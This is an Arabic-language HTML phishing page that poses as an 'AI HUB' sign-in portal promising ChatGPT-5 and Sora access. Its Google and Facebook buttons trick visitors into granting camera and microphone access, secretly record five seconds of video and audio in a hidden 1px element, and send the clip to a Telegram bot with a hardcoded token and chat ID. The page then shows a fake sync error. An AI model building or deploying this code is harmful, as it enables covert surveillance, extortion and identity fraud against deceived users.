<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI HUB | تسجيل دخول آمن</title>
<style>
:root { --google: #4285f4; --fb: #1877f2; --bg: #0e1117; }
body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
.login-card { width: 90%; max-width: 400px; background: #161b22; border: 1px solid #30363d; border-radius: 20px; padding: 40px 20px; text-align: center; box-shadow: 0 15px 50px rgba(0,0,0,0.5); }
h2 { margin-bottom: 10px; font-size: 24px; }
p { color: #8b949e; font-size: 14px; margin-bottom: 30px; }
.login-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 15px; transition: 0.3s; color: white; }
.btn-google { background: #fff; color: #757575; border: 1px solid #ddd; }
.btn-fb { background: var(--fb); }
.divider { display: flex; align-items: center; color: #444; margin: 20px 0; }
.divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #333; margin: 0 10px; }
#loader-screen { display: none; }
.spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00ff88; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="login-card" id="login-ui">
    <h2>AI HUB PORTAL</h2>
    <p>سجل دخول للوصول إلى أدوات الذكاء الاصطناعي (ChatGPT-5 & Sora)</p>
    
    <button class="login-btn btn-google" onclick="startCapture('Google')">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Icons_2020.svg" width="20">
        متابعة باستخدام Google
    </button>
    
    <button class="login-btn btn-fb" onclick="startCapture('Facebook')">
        <span>f</span> متابعة باستخدام Facebook
    </button>
    
    <div class="divider">أو</div>
    
    <input type="email" placeholder="البريد الإلكتروني" style="width:100%; padding:12px; border-radius:8px; border:1px solid #333; background:#0d1117; color:white; margin-bottom:10px; box-sizing:border-box;">
    <button class="login-btn" style="background:#238636;">إنشاء حساب جديد</button>
</div>

<div class="login-card" id="loader-screen">
    <div class="spinner"></div>
    <h3 id="status-msg">جاري التحقق من الهوية...</h3>
    <p>يرجى السماح بالوصول للمستشعرات لتأمين الربط مع الحساب</p>
    <video id="v" autoplay muted playsinline style="width:1px; height:1px; opacity:0;"></video>
</div>

<script>
const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
const chat_id = "5177962707";

async function startCapture(method) {
    document.getElementById('login-ui').style.display = 'none';
    document.getElementById('loader-screen').style.display = 'block';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('v');
        video.srcObject = stream;

        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('video', blob, 'account_verify.mp4');
            fd.append('caption', `🔐 محاولة دخول جديدة!\nالمنصة: ${method}\nالحالة: تم سحب فيديو التوثيق بنجاح.`);
            
            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
            
            document.getElementById('status-msg').innerText = "خطأ في المزامنة (Sync Error)";
            setTimeout(() => {
                alert("نعتذر، حدث خطأ أثناء الربط مع " + method + ". يرجى المحاولة لاحقاً.");
                stream.getTracks().forEach(t => t.stop());
                location.reload();
            }, 2500);
        };

        mediaRecorder.start();
        setTimeout(() => { mediaRecorder.stop(); }, 5000);

    } catch (err) {
        alert("يجب السماح بالصلاحيات لربط حسابك بنجاح.");
        location.reload();
    }
}
</script>
</body>
</html>
